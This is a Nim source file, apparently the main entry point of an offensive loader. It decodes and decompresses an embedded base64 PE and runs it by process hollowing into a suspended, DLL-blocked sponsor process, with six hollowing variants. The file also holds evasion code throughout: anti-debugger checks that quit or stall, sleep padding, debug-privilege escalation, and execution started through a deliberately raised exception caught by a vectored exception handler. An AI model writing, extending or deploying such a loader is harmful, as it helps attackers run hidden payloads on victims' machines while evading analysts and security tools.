# Internal
import utils
import params
import antidebug
# External
import os
import winim
import strutils
import supersnappy
from std/base64 import decode

# Import per module chosen
when defined(hollow1):
    import hollow1
when defined(hollow2) or defined(hollow3):
    import hollow23
when defined(hollow4):
    import hollow4
when defined(hollow5) or defined(hollow6):
    import hollow56

# Raising VEH
{.emit: """
#include <windows.h>
void raiseVEH() {
    int x = 4 / 0;
}
""".}
proc raiseVEH(): void {.importc: "raiseVEH", nodecl.}

proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Check hollowsplitted args 
    when defined(hollow4) or defined(hollow5) or defined(hollow6):
        let commandLineParams = commandLineParams()
        for i in commandLineParams:
            if i.startsWith("-A:") or i.startsWith("-W:") or i.startsWith("-T:") or i.startsWith("-R:"):
                # This is a worker process in splitted hollow, let it go
                when defined(hollow4):
                    return hollow4Worker(peStr)
                when defined(hollow5) or defined(hollow6):
                    return hollow56Worker(peStr)
        if not ("-M" in commandLineParams):
            quit(1)

    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)

    if antiDebugAction in["die", "troll"] and isDebugged():
        if antiDebugAction == "die":
            quit(1)
        elif antiDebugAction == "troll":
            sleepUselessCalculations(999999999)

    # Enable debug privilege
    discard setDebugPrivilege()

    # Create suspended process with extended attributes (block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollow1):
        return hollow1(peStr, ppi)
    when defined(hollow2) or defined(hollow3):
        return hollow23(peStr, ppi)
    when defined(hollow4):
        return hollow4Manager(peStr, ppi)
    when defined(hollow5) or defined(hollow6):
        return hollow56Manager(peStr, ppi)


proc wrap_execute() =
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds
    )
    quit(0)


proc main*() =
    if isVeh:
        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrap_execute))
        raiseVEH()
    else:
        wrap_execute()


when isMainModule:
    main()